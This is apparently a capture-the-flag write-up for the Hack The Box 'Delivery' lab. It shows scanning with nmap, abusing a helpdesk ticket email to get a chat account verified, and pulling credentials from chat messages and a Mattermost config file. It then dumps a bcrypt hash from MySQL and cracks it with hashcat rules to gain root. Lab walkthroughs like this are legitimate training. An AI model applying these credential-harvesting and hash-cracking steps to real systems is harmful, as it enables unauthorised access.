# User

scan

nmap -sS -T4 -A 10.10.10.222

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

80/tcp open  http    nginx 1.14.2


#open the web page

#add ip to the hosts file

nano /etc/hosts


#first I tried to signup and add email

#then I realized that the machine wasn't on the internet

#open new ticket

#if you have any error then change the email address beacuse someone else used it

#save the ticket id and the email we will use those

ticket id: 4701529

4701529@delivery.htb


#now we go to Check Ticket Status

#type the email and tickt id

#now,we go to Mattermost server and create an account with the ticket number email then refresh the ticket

#if the server didn't open add the server ip o the hosts

#You have to use ticket number email it gives you when you create the ticket

8113433@delivery.htb.

now what happened that you taked the email that was supposed to be the support email and creat the Mattermost server with it

# the verfing email goes to the ticket view page

#It’s kind of a hack, instead of going to an email it went to the ticket page instead

That should have went to an email address, not the details of the ticket

So you just tricked the application into creating an account when before it wouldn’t let you

#copy/paste that huge link


#the root saied

@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!

Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

#now we have the credintials to access the server

username:maildeliverer

password:Youve_G0t_Mail!

#using ssh to enter

Bingo now you own the user

## Screenshots

![image](https://user-images.githubusercontent.com/24206178/154683068-e2839697-8555-4b2a-a981-bba6d3b00cb4.png)

![image](https://user-images.githubusercontent.com/24206178/154683088-728f53c3-00e9-4481-90e4-cff84eadd594.png)

![image](https://user-images.githubusercontent.com/24206178/154683116-3bf0159f-2054-477b-a41f-8c1fb7cbee92.png)

![image](https://user-images.githubusercontent.com/24206178/154683152-fe35883b-f604-4f95-b4fd-bc991fe42882.png)

![image](https://user-images.githubusercontent.com/24206178/154683083-cc581f88-1a42-4c8e-b06a-b9610df0842d.png)

![image](https://user-images.githubusercontent.com/24206178/154683238-36592571-85da-451f-9f0f-4a6217dbaeee.png)

![image](https://user-images.githubusercontent.com/24206178/154683243-1334f5d2-6933-42a5-a199-0b8d9774cada.png)

![image](https://user-images.githubusercontent.com/24206178/154683255-dca2c774-cddd-489c-a6be-de2c13e05021.png)

![image](https://user-images.githubusercontent.com/24206178/154683248-09cc9c19-958f-41a2-a8ad-7f04d2a7ed49.png)


# Root

#now we are using maildeliverer

#we will go to the database

/opt/mattermost

find . -type f -name ‘*.config’

json.config

#in sqlsettings

mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)

bingo!!

#credentials to a database

#sql username and password

username:mmuser

pass:Crack_The_MM_Admin_PW

#now we enter the database

mysql --host=127.0.0.1 --user=mmuser --password=Crack_The_MM_Admin_PW


show databases;
Database           |
+--------------------+
| information_schema |
| mattermost         |

use mattermost;

show tables;

Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+

select * from Users;

| dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 |        0 | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     |             | root@delivery.htb       |             1 |          |                    |          |          | system_admin system_user |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609157893370 |                 0 |              0 | en     | {"automaticTimezone":"Africa/Abidjan","manualTimezone":"","useAutomaticTimezone":"true"}   |         0 |           |


#we found the hash for the password for the root

now lets get back to the hint that was in 

Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

so now we know the password is a pattern from PleaseSubscribe!

#we need to know the type of the hash

#search for it at https://hashcat.net/wiki/doku.php?id=example_hashes

#Do Ctrl + f on the page and type $2a$ then which one matches

it is bcrypt $2*$, Blowfish (Unix)


echo PleaseSubscribe! > pass.txt is your wordlist
echo $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO > h.hash is your hash

ls -l /usr/share/hashcat/rules/

#And pick one, one of them will work

root@kali:/usr/share/hashcat/rules# hashcat -m 3200 hash.hash pass.txt -r best64.rule

maildeliverer@Delivery:~$ su root

Password: 
root@Delivery:/home/maildeliverer# whoami

root

cat /root/root.txt

# Screenshots

![image](https://user-images.githubusercontent.com/24206178/154683335-7f37ccdc-2812-4fbd-a820-39e0bdf5aa3a.png)

![image](https://user-images.githubusercontent.com/24206178/154683355-bd69b018-50c7-46c3-8a77-cb924a549b42.png)

![image](https://user-images.githubusercontent.com/24206178/154683372-149490c0-7e9b-4353-b597-4a515a833451.png)

